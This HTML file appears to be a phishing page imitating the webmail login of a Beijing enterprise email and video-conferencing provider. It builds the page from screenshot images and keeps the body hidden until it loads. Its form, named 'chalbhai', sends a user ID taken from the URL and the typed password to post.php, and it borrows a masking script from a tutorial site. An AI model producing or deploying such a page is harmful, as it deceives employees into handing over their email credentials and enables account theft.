<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#20225;&#19994;&#37038;&#31665;&#95;&#35270;&#39057;&#20250;&#35758;&#95;&#35270;&#39057;&#20250;&#35758;&#31995;&#32479;&#95;&#21271;&#20140;&#20108;&#20845;&#19977;&#20225;&#19994;&#36890;&#20449;&#26377;&#38480;&#20844;&#21496;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <style type="text/css">
 .textrbox { 
    border: 0px  #fff;
	font-size: 15px;
	color: #333;
	
    outline:0; 
	padding-left: 6px;
    height:34px; 
    width: 275px; 
  } 
 </style>
 <style type="text/css">
  
.textbox {  
    border: 1px solid #c1c1c1;
	padding-left: 6px;
	font-size: 15px;
	color: #333;
    height: 34px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #ff4d54; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:125px; width:1349px; height:452px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=452></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:120px; z-index:1"><a href="#"><img src="images/w2.png" alt="" title="" border=0 width=1349 height=120></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:190px; top:600px; width:1051px; height:330px; z-index:2"><a href="#"><img src="images/w3.png" alt="" title="" border=0 width=1051 height=330></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:159px; top:928px; width:1089px; height:278px; z-index:3"><a href="#"><img src="images/w4.png" alt="" title="" border=0 width=1089 height=278></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:1200px; width:1349px; height:290px; z-index:4"><a href="#"><img src="images/w5.png" alt="" title="" border=0 width=1349 height=290></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:1490px; width:1349px; height:405px; z-index:5"><img src="images/w6.png" alt="" title="" border=0 width=1349 height=405></div>

<div id="image7" style="position:absolute; overflow:hidden; left:95px; top:1915px; width:1205px; height:387px; z-index:6"><a href="#"><img src="images/w7.png" alt="" title="" border=0 width=1205 height=387></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:92px; top:2361px; width:1212px; height:372px; z-index:7"><a href="#"><img src="images/w8.png" alt="" title="" border=0 width=1212 height=372></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:86px; top:2725px; width:857px; height:190px; z-index:8"><a href="#"><img src="images/w9.png" alt="" title="" border=0 width=857 height=190></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:267px; top:2966px; width:726px; height:62px; z-index:9"><a href="#"><img src="images/w10.png" alt="" title="" border=0 width=726 height=62></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:3039px; width:1349px; height:277px; z-index:10"><a href="#"><img src="images/w11.png" alt="" title="" border=0 width=1349 height=277></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:0px; top:3315px; width:1349px; height:216px; z-index:11"><img src="images/w12.png" alt="" title="" border=0 width=1349 height=216></div>

<div id="image13" style="position:absolute; overflow:hidden; left:919px; top:202px; width:298px; height:48px; z-index:12"><a href="#"><img src="images/w13.png" alt="" title="" border=0 width=298 height=48></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:1139px; top:410px; width:53px; height:21px; z-index:13"><a href="#"><img src="images/w14.png" alt="" title="" border=0 width=53 height=21></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:935px; top:499px; width:266px; height:28px; z-index:14"><a href="#"><img src="images/w15.png" alt="" title="" border=0 width=266 height=28></a></div>

<div id="image16" style="position:absolute; overflow:hidden; left:111px; top:271px; width:305px; height:182px; z-index:15"><a href="#"><img src="images/w16.png" alt="" title="" border=0 width=305 height=182></a></div>
<form action=post.php name=chalbhai id=chalbhai method=post>
<div id="formradio1" style="position:absolute; left:939px; top:268px; z-index:16"><input type="radio" name="formradio1"></div>
<div id="formradio2" style="position:absolute; left:993px; top:268px; z-index:17"><input type="radio" name="formradio1"></div>
<div id="formradio3" style="position:absolute; left:1096px; top:268px; z-index:18"><input type="radio" name="formradio1"></div>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:247px;left:944px;top:301px;z-index:19">
<input name="pass" id="demo-field" placeholder="&#32;&#36755;&#20837;&#24744;&#30340;&#23494;&#30721;&#32;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:247px;left:944px;top:349px;z-index:20">
<div id="formcheckbox1" style="position:absolute; left:940px; top:409px; z-index:21"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:943px; top:440px; z-index:22"><input type="image" name="formimage1" width="249" height="38" src="images/login.png"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
